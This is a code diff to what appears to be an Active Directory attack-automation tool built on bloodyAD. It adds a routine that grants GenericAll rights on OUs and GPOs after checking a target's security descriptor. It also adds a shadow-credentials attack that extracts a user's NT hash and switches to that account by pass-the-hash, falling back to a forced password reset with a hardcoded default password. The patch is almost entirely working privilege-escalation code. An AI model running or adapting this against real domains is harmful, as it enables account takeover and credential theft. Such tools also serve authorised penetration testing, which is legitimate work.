@@ -1,6 +1,7 @@
 from bloodyAD import ConnectionHandler
 from bloodyAD.cli_modules import add, set, remove, get
 from bloodyAD.exceptions import LOG
+from bloodyAD.network.ldap import accesscontrol
 import base64
 # Constant for password changes
 PASSWORD_DEFAULT = "AutoBl00dy123!"
@@ -16,9 +17,9 @@ class Automation:
             3: self._ownerDomain,
             4: self._readGMSAPassword,
             100: self._addMember,
-            200: self._aclGroup,
+            200: self._aclOuGpo,
             300: self._ownerGroup,
-            100000: self._forceChangePassword,
+            100000: self._shadowCredentialsOrForceChange,
             100001: self._aclObj,
             100002: self._ownerObj,
             110000: self._forceChangePassword,
@@ -161,6 +162,78 @@ class Automation:
         await self._genericAll(rel)
         await self._addMember(rel)
 
+    async def _aclOuGpo(self, rel):
+        """
+        Check if the ntsecuritydescriptor has GenericAll or GenericWrite with inheritance set.
+        If inheritance is not set, call _genericAll.
+        """
+        if self.simulation:
+            # In simulation mode, just call _genericAll
+            await self._genericAll(rel)
+        else:
+            # Get the current security descriptor
+            target_dn = rel["end_node"]["distinguishedname"]
+            user_dn = rel["start_node"]["distinguishedname"]
+            
+            # Get the SID of the calling user
+            ldap = await self.conn.getLdap()
+            user_entry = None
+            async for entry in ldap.bloodysearch(user_dn, attr=["objectSid"]):
+                user_entry = entry
+                break
+            
+            if not user_entry:
+                LOG.warning(f"Could not find user SID for {user_dn}, calling _genericAll")
+                await self._genericAll(rel)
+                return
+            
+            user_sid = user_entry["objectSid"]
+            
+            # Get the security descriptor of the target
+            target_entry = None
+            async for entry in ldap.bloodysearch(target_dn, attr=["nTSecurityDescriptor"]):
+                target_entry = entry
+                break
+            
+            if not target_entry or "nTSecurityDescriptor" not in target_entry:
+                LOG.warning(f"Could not retrieve nTSecurityDescriptor for {target_dn}, calling _genericAll")
+                await self._genericAll(rel)
+                return
+            
+            # Parse the security descriptor
+            sd_data = target_entry["nTSecurityDescriptor"]
+            sd = add.SECURITY_DESCRIPTOR()
+            sd.from_bytes(sd_data)
+            
+            # Check if user has GenericAll or GenericWrite with inheritance
+            has_inherited_right = False
+            for ace in sd["Dacl"].aces:
+                # Check if this ACE is for our user
+                ace_sid = ace["Ace"]["Sid"].formatCanonical()
+                if ace_sid == user_sid:
+                    # Check if it has GenericAll or GenericWrite permissions
+                    mask = ace["Ace"]["Mask"]["Mask"]
+                    # GenericAll = 0x10000000 (GENERIC_ALL), GenericWrite = 0x40000000 (GENERIC_WRITE)
+                    # Or check for full control (0x000f01ff)
+                    has_generic_all = (mask & 0x10000000) or (mask & 0x000f01ff) == 0x000f01ff
+                    has_generic_write = mask & 0x40000000
+                    
+                    if has_generic_all or has_generic_write:
+                        # Check if ACE has inheritance flags
+                        ace_flags = ace["AceFlags"]
+                        # Check for CONTAINER_INHERIT_ACE (2) or OBJECT_INHERIT_ACE (1)
+                        has_inheritance = (ace_flags & 1) or (ace_flags & 2)
+                        
+                        if has_inheritance:
+                            has_inherited_right = True
+                            LOG.info(f"User {user_dn} already has GenericAll/GenericWrite with inheritance on {target_dn}")
+                            break
+            
+            # If no inherited right found, add it
+            if not has_inherited_right:
+                LOG.info(f"User {user_dn} does not have GenericAll/GenericWrite with inheritance on {target_dn}, adding it")
+                await self._genericAll(rel)
+
     async def _ownerGroup(self, rel):
         await self._setOwner(rel)
         await self._aclGroup(rel)
@@ -176,6 +249,51 @@ class Automation:
     async def _ownerSpecialObj(self, rel):
         await self._setOwner(rel)
         await self._genericAll(rel)
+
+    async def _shadowCredentialsOrForceChange(self, rel):
+        """
+        Try to use shadowCredentials first, fall back to forceChangePassword if not possible
+        """
+        try:
+            if self.simulation:
+                user = rel["end_node"]["name"]
+                self._printOperation("password", [user, "shadowCredentials"])
+            else:
+                target_dn = rel["end_node"]["distinguishedname"]
+                
+                # Try shadowCredentials
+                LOG.info("Attempting shadowCredentials attack")
+                result = await add.shadowCredentials(self.conn, target_dn)
+                
+                # Extract NT hash from result
+                if result and len(result) > 0:
+                    nthash = result[0].get('NT')
+                    if nthash:
+                        LOG.info(f"Successfully obtained NT hash via shadowCredentials")
+                        
+                        # Get the sAMAccountName for the user
+                        ldap = await self.conn.getLdap()
+                        user_entry = None
+                        async for entry in ldap.bloodysearch(target_dn, attr=["sAMAccountName"]):
+                            user_entry = entry
+                            break
+                        
+                        if user_entry:
+                            user = user_entry["sAMAccountName"]
+                            # Pass NT hash in the format ":nt_hash" for NTLM authentication
+                            pwd = ":"+nthash
+                            LOG.info(f"Switching to user: {user}")
+                            await self._switchUser(user, pwd)
+                            return
+                        
+                # If we get here, shadowCredentials didn't work as expected
+                LOG.warning("shadowCredentials did not return expected results, falling back to forceChangePassword")
+                await self._forceChangePassword(rel)
+                
+        except Exception as e:
+            # If shadowCredentials fails, fall back to forceChangePassword
+            LOG.warning(f"shadowCredentials failed: {e}, falling back to forceChangePassword")
+            await self._forceChangePassword(rel)
 
     # ForceChangePassword edge directly changes the password
     async def _forceChangePassword(self, rel):
